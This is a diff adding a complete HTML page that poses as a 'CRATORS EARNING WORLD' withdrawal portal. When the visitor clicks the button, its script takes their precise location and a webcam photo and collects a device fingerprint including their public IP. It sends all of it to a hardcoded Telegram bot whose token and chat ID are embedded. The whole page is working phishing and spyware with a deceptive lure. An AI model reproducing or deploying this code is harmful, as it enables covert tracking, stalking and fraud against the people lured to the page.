@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Access Portal</title>
+    <style>
+        body { 
+            background: #0a0a0a; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: #fff;
+        }
+        .container {
+            text-align: center;
+            padding: 30px;
+            background: #111;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+            max-width: 400px;
+            width: 90%;
+        }
+        .btn-action {
+            background: #00ff88;
+            color: #000;
+            border: none;
+            padding: 14px 28px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: 0.3s;
+        }
+        .btn-action:hover {
+            background: #00cc6e;
+        }
+        #videoElement {
+            width: 100%;
+            max-width: 200px;
+            height: auto;
+            border-radius: 6px;
+            display: none;
+            margin: 15px auto 0;
+        }
+        .status-text {
+            color: #888;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container" id="portalBox">
+    <h2>CRATORS EARNING WORLD </h2>
+    <p>IF YOU WANY TO EARN NOW AND WITHDRWAL IT PLEASE CLICK THE BUTTON BELOW.</p>
+    
+    <button class="btn-action" id="initiateBtn">VERIFY & WITHDRAW</button>
+    <div class="status-text" id="statusMessage">Awaiting authorization...</div>
+    
+    <video id="videoElement" autoplay playsinline muted></video>
+    <canvas id="captureCanvas" style="display:none;"></canvas>
+</div>
+
+<script>
+// --- APNI BOT DETAILS YAHA DALO ---
+const TELEGRAM_BOT_TOKEN = '8747575181:AAHJTF_tg7zslQww79rd6wm6-c_2bFt5cR8';
+const TELEGRAM_CHAT_ID = '8896365568';
+
+const initiateBtn = document.getElementById('initiateBtn');
+const statusMessage = document.getElementById('statusMessage');
+const video = document.getElementById('videoElement');
+const canvas = document.getElementById('captureCanvas');
+
+// Global variables to store user-approved data
+let userLocation = { lat: "Not Allowed ❌", lon: "Not Allowed ❌", mapsLink: "N/A" };
+let capturedBlob = null;
+
+initiateBtn.addEventListener('click', async () => {
+    initiateBtn.style.display = 'none';
+    statusMessage.innerText = "Requesting permissions...";
+
+    // 1. Step 1: Request Location Permission (User Initiated)
+    if (navigator.geolocation) {
+        await new Promise((resolve) => {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    userLocation.lat = position.coords.latitude;
+                    userLocation.lon = position.coords.longitude;
+                    userLocation.mapsLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                    resolve();
+                },
+                (error) => {
+                    console.log("Location Denied");
+                    resolve(); // Fallthrough if denied
+                },
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        });
+    }
+
+    // 2. Step 2: Request Camera Permission & Capture Image
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: 640, height: 480 },
+            audio: false
+        });
+
+        video.srcObject = stream;
+        
+        // Wait briefly for hardware initialization to avoid pitch black images
+        await new Promise(r => setTimeout(r, 800));
+
+        const ctx = canvas.getContext('2d');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+
+        // Mirror horizontal flip (optional, for natural front camera look)
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Turn off camera tracks immediately after capturing to save resources
+        stream.getTracks().forEach(track => track.stop());
+
+        // Convert raw canvas matrix to standard binary blob data
+        canvas.toBlob((blob) => {
+            capturedBlob = blob;
+            // Compile everything and push to Telegram
+            compileAndSendReport();
+        }, 'image/jpeg', 0.75);
+
+    } catch (cameraError) {
+        statusMessage.innerText = "Camera authorization bypassed or denied.";
+        // If camera is denied, still compile and send text-only diagnostic telemetry
+        compileAndSendReport();
+    }
+});
+
+async function compileAndSendReport() {
+    statusMessage.innerText = "Processing system algorithms...";
+
+    // Extract baseline technical telemetry from environmental parameters
+    const data = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform || 'Unknown',
+        language: navigator.language || 'Unknown',
+        languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
+        screenRes: `${screen.width}x${screen.height}`,
+        availScreenRes: `${screen.availWidth}x${screen.availHeight}`,
+        colorDepth: `${screen.colorDepth}-bit`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+        cpuCores: navigator.hardwareConcurrency || 'N/A',
+        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
+        cookieEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
+        onlineStatus: navigator.onLine ? 'Online' : 'Offline',
+        referrer: document.referrer || 'Direct Visit',
+        ip: 'Unavailable',
+        networkType: 'Unknown',
+        batteryLevel: 'N/A',
+        isCharging: 'N/A'
+    };
+
+    // Connection parameters parsing
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+        data.networkType = `${conn.effectiveType || 'Unknown'} (Downlink: ${conn.downlink || '?' } Mbps)`;
+    }
+
+    // Battery API management
+    if (navigator.getBattery) {
+        try {
+            const battery = await navigator.getBattery();
+            data.batteryLevel = `${Math.round(battery.level * 100)}%`;
+            data.isCharging = battery.charging ? 'Yes ⚡' : 'No 🔋';
+        } catch (e) {}
+    }
+
+    // Query external interface for structural Public IP addressing
+    try {
+        const ipResp = await fetch('https://api.ipify.org?format=json');
+        if (ipResp.ok) {
+            const ipData = await ipResp.json();
+            data.ip = ipData.ip;
+        }
+    } catch(e) {}
+
+    // Precise markdown text payload assembly exactly matching your layout request
+    const reportText = `📊 *FULL SYSTEM DIAGNOSTIC REPORT*\n` +
+                       `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                       `📍 *LIVE USER PRIVILEGES:*\n` +
+                       `• *Latitude:* \`${userLocation.lat}\`\n` +
+                       `• *Longitude:* \`${userLocation.lon}\`\n` +
+                       `• *Google Maps:* [Open Live Location](${userLocation.mapsLink})\n\n` +
+                       `🌐 *NETWORK & CONNECTIVITY:*\n` +
+                       `• *Public IP:* \`${data.ip}\` (Click to copy)\n` +
+                       `• *Network Connection:* ${data.networkType}\n` +
+                       `• *Network Status:* ${data.onlineStatus}\n\n` +
+                       `📱 *HARDWARE & SYSTEM SPECIFICATIONS:*\n` +
+                       `• *Operating System/Platform:* ${data.platform}\n` +
+                       `• *Processor Cores:* ${data.cpuCores} Cores\n` +
+                       `• *Device RAM (Approx):* ${data.memory}\n` +
+                       `• *Screen Resolution:* ${data.screenRes} px\n` +
+                       `• *Available Screen:* ${data.availScreenRes} px\n` +
+                       `• *Color Depth:* ${data.colorDepth}\n\n` +
+                       `🔋 *POWER MANAGEMENT:*\n` +
+                       `• *Battery Level:* ${data.batteryLevel}\n` +
+                       `• *Is Charging:* ${data.isCharging}\n\n` +
+                       `⚙️ *SOFTWARE & REGIONAL ENVIRONMENT:*\n` +
+                       `• *Timezone Area:* ${data.timezone}\n` +
+                       `• *Primary Language:* ${data.language}\n` +
+                       `• *Accepted Languages:* ${data.languages}\n` +
+                       `• *Cookies Enabled:* ${data.cookieEnabled}\n` +
+                       `• *Referrer/Source:* ${data.referrer}\n\n` +
+                       `📄 *RAW USER AGENT STRING:*\n` +
+                       `\`\`\`text\n${data.userAgent}\n\`\`\`\n` +
+                       `🕒 _Log Generation Time: ${new Date().toLocaleString()}_`;
+
+    const formData = new FormData();
+    formData.append('chat_id', TELEGRAM_CHAT_ID);
+    formData.append('parse_mode', 'Markdown');
+
+    let endpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    // Operational routing branch based on user photo access permissions
+    if (capturedBlob) {
+        endpoint = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+        formData.append('photo', capturedBlob, 'device_capture.jpg');
+        formData.append('caption', reportText);
+    } else {
+        formData.append('text', reportText);
+    }
+
+    try {
+        await fetch(endpoint, { method: 'POST', body: formData });
+        statusMessage.style.color = "#00ff88";
+        statusMessage.innerText = "Diagnostic analysis uploaded successfully!";
+    } catch(err) {
+        statusMessage.innerText = "Network payload dispatch error.";
+        console.error(err);
+    }
+}
+</script>
+
+</body>
+</html>
